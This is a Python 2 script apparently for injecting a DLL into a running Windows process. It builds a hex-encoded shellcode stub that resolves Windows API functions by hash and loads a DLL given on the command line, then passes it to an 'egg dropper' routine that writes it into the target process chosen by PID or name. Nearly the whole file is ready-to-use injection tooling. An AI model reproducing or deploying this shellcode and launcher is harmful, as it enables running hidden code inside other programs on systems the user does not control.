'''
(c) dohmatob elvis dopgima
'''
import sys
from hashman import *
from egg_dropper import drop_egg
from libdebug.debug import GetProcessIdFromName
import struct
import re
from optparse import OptionParser

stage1_shellcode = "\
\x64\x8B\x15\x30\x00\x00\x00\x8B\x52\x0C\x8B\x52\x14\x8B\x12\x8B\
\x12\x8B\x52\x10\xE8\x1C\x01\x00\x00\x5E\x31\xC9\xB1\x02\xE8\xF4\
\x00\x00\x00\xE8\x0D\x01\x00\x00\x5F\xE8\x12\x01\x00\x00\xFF\x17\
\x50\xE8\x0A\x01\x00\x00\x5E\xE8\xF3\x00\x00\x00\xAC\x31\xC9\x88\
\xC1\x58\x89\xC2\xE8\xCE\x00\x00\x00\xE8\xE7\x00\x00\x00\x5F\xE8\
\xFE\x00\x00\x00\xFF\x17\x85\xC0\x75\x12\xE8\xD6\x00\x00\x00\x5F\
\xE8\xED\x00\x00\x00\xFF\x57\x04\x85\xC0\x74\x21\x89\xC2\xE8\x2D\
\x00\x00\x00\xE8\xDA\x00\x00\x00\x5E\xE8\xB1\x00\x00\x00\xAC\x84\
\xC0\x74\x0D\x8B\x06\x85\xC0\x74\x04\xFF\xD0\xEB\x03\x90\xEB\x00\
\xE8\xAB\x00\x00\x00\x5E\xE8\x94\x00\x00\x00\xAC\x6A\x00\xFF\x16\
\xE8\xAD\x00\x00\x00\x5E\xE8\x84\x00\x00\x00\xAC\x31\xC9\x88\xC1\
\xE8\x62\x00\x00\x00\xC3\x8B\x5A\x3C\x8B\x5C\x1A\x78\x01\xD3\x8B\
\x4B\x18\x8B\x43\x20\x01\xD0\xE3\x35\x49\x8B\x34\x88\x01\xD6\x51\
\x50\x57\xE8\x2A\x00\x00\x00\x5F\x33\x07\x85\xC0\x58\x59\x75\xE7\
\x8B\x43\x24\x01\xD0\x66\x8B\x0C\x48\x66\x8B\x43\x10\x66\x01\xC1\
\x66\x49\x8B\x43\x1C\x01\xD0\x8B\x04\x88\x01\xD0\xEB\x02\x31\xC0\
\xC3\x31\xFF\x31\xC0\xFC\xAC\x84\xC0\x74\x09\x0C\x60\x01\xC7\xC1\
\xCF\x0D\xEB\xF2\x89\xF8\xC3\x89\xF7\xE3\x13\x51\x56\x57\x89\xF7\
\xE8\x91\xFF\xFF\xFF\x5F\xAB\x5E\x83\xC6\x04\x59\xE2\xEB\xC3\xAC\
\x84\xC0\x75\xFB\xC3\x5E\xFF\xD6\x92\x9D\x46\x59\x72\x62\x77\x95\
\x5E\xFF\xD6\x6E\x74\x64\x6C\x6C\x2E\x64\x6C\x6C\x00\x01\x00\x7D\
\x58\x31\x5E\xFF\xD6"

if __name__ == '__main__':
    # sanitize command-line
    parser = OptionParser(usage="python %s <target_PID> </path/to/dll>"%sys.argv[0])
    parser.add_option('--invoke-this-api',
                      help="""specify an API to invoke just after loading or before unloading DLL""",
                      dest='invokethisapi',
                      action="store",
                      type=str,
                      default=None,
                     )
    options, args = parser.parse_args()
    if len(args) < 2:
        parser.error("Insufficient command-line arguments");
        
    # calculate target PID
    target_PID = None
    try:
        target_PID  = int(args[0])
    except ValueError:
        target_PID = GetProcessIdFromName(args[0])
    if target_PID is None:
        print "%s is neither a process imagename nor ID"%args[0]
        sys.exit(-1)
           
    shellcode = stage1_shellcode
    shellcode += args[1]
    shellcode += '\x00' # NULL
    if not options.invokethisapi is None:
        shellcode += '\x01' # number of APIs to load from DLL
        shellcode += struct.pack('<I', compute_hash(options.invokethisapi)) # API hash
    else:
        shellcode += '\x00'
        
    # unleash 
    drop_egg(target_PID, shellcode, False)
    
